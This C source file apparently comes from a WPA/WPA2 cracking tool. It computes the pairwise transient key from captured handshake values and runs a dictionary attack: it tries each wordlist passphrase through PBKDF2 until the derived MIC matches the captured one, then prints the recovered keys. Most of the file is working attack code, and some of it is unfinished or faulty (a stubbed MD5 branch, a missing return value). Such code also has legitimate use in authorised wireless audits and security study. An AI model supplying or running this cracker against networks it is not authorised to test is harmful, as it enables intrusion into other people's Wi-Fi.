#include "crypto.h"

int wpa_pmk_to_ptk(u8 *pmk, u8 *addr1, u8 *addr2, 
		u8 *nonce1, u8 *nonce2, u8 *ptk, size_t ptk_len) {
	if (!pmk || !addr1 || !addr2 || !nonce1 || !nonce2 || !ptk || ptk_len < 0 ) {
		log_printf(MSG_WARNING, "Calculate PTK failure, Invalid input parameter.");
		return -1;
	}
	u8 data[2 * ETH_ALEN + 2 * NONCE_ALEN];
	memset(data, 0 , sizeof(data));
	/***
	 * PTK = PRF-X(PMK, "Pairwise key expansion",
	 * 		Min(AA,SA) || Max(AA,SA) || 
	 * 		Min(ANonce, SNonce) || Max(ANonce, SNonce))
	 **/
	if (memcmp(addr1, addr2, ETH_ALEN) < 0) {
		memcpy(data, addr1, ETH_ALEN);
		memcpy(data + ETH_ALEN, addr2, ETH_ALEN);
	} else {
		memcpy(data, addr2, ETH_ALEN);
		memcpy(data + ETH_ALEN, addr1, ETH_ALEN);
	}
	
	if (memcmp(nonce1, nonce2, NONCE_ALEN) < 0) {
		memcpy(data + ETH_ALEN * 2, nonce1, NONCE_ALEN);
		memcpy(data + ETH_ALEN * 2 + NONCE_ALEN, nonce2, NONCE_ALEN);
	} else {
		memcpy(data + ETH_ALEN * 2, nonce2, NONCE_ALEN);
		memcpy(data + ETH_ALEN * 2 + NONCE_ALEN, nonce1, NONCE_ALEN);
	}
	sha1_prf(pmk, 32, "Pairwise key expansion", data, 
			sizeof(data), ptk, ptk_len);

	return 0;
}

int hmac_hash(int ver, u8 *key, int hashlen, u8 *buf, int buflen, u8 *mic) {
	u8 hash[SHA1_MAC_LEN];

	switch (ver) {
	case WPA_KEY_INFO_TYPE_HMAC_MD5_RC4 :
		/* TODO : We should finish the hmac_md5 method 
		 * after we test the whloe process can execute correct. */
//		hmac_md5(key, hashlen, buf, buflen, mic);
		break;
	case WPA_KEY_INFO_TYPE_HMAC_SHA1_AES :
		hmac_sha1(key, hashlen, buf, buflen, hash, NOCACHED);
		memcpy(mic, hash, MD5_DIGEST_LENGTH); /* only 16 bytes, not 20. */
		break;
	default:
		log_printf(MSG_WARNING, "Unknow encryption version 0x%x.", ver);
		return -1;
	}
	return 0;
}

int nextdictword(char *word, FILE *fp) {
	if (fgets(word, MAXPASSLEN + 1, fp) == NULL) {
		return -1;
	}
	word[strlen(word) - 1] = '\0';
	if (feof(fp)) {
		return -1;
	}
	return strlen(word);
}

int dictionary_attack(const char *dictionary_path, struct encrypto_info *info, int cracked) {
	FILE *fp;
	int fret;
	u8 pmk[32];
	u8 ptk[64];
	u8 keymic[16];
	struct wpa_ptk ptkset;
	if (!info->password)
		info->password = malloc(MAXPASSLEN + 1);
	if (!info->password) {
		log_printf(MSG_WARNING, "[%s]Malloc memory failed, with error:"RED"%s"NONE, strerror(errno));
	}
	fp = fopen(dictionary_path, "r");
	if (fp == NULL) {
		log_printf(MSG_WARNING, "Couldn't open dictionary, with error:"RED"%s"NONE, strerror(errno));
		return -1;
	}

	struct wpa_eapol_key *eapol_frame;
	eapol_frame = (struct wpa_eapol_key *)info->eapol;
	memset(eapol_frame->key_mic, 0, sizeof(eapol_frame->key_mic));
	eapol_frame->eapol_len = ntohs(eapol_frame->eapol_len);
	eapol_frame->key_info = ntohs(eapol_frame->key_info);
	eapol_frame->key_length = ntohs(eapol_frame->key_length);

  if (cracked)
    goto calculate_ptk;
	/* TODO : We should break this loop when receive cli break request. */
	while (feof(fp) == 0) {
		fret = nextdictword(info->password, fp);
		if (fret < 0) {
			break;
		}
		CURSOR_UP_LINE(1);
		CLEAR_LINE_FROM_CURSOR_POSITION();
		log_printf(MSG_DEBUG, "Test \"%s\" to crash \"%s\" access point", info->password, info->SSID);
		/*
		 * Test length of word. IEEE 802.11i indicates the passphrase
		 * must be at least 8 characters in length, and no more than 63
		 * characters in length.
	 	*/
		if (fret < 8 || fret > 63) 
			continue;
calculate_ptk:
    pbkdf2_sha1(info->password, info->SSID, strlen(info->SSID), 4096, pmk, sizeof(pmk), USECACHED);
		wpa_pmk_to_ptk(pmk, info->AA, info->SA, info->AN, info->SN, ptk, sizeof(ptk));
		memcpy(&ptkset, ptk, sizeof(ptkset));
		hmac_hash(info->version, ptkset.mic_key, 16, info->eapol, sizeof(struct wpa_eapol_key), keymic);
		if (!memcmp(&info->MIC, &keymic, sizeof(keymic))) {
			lamont_hdump(MSG_DEBUG, "Pair Master Key",pmk, sizeof(pmk));
			lamont_hdump(MSG_DEBUG, "Pair Transient Key", ptk, sizeof(ptk));
			lamont_hdump(MSG_DEBUG, "Message Integrity Check", keymic, sizeof(keymic));
			memcpy(&info->ptk, ptk, sizeof(ptk));
			return 0;
		}
	}
}
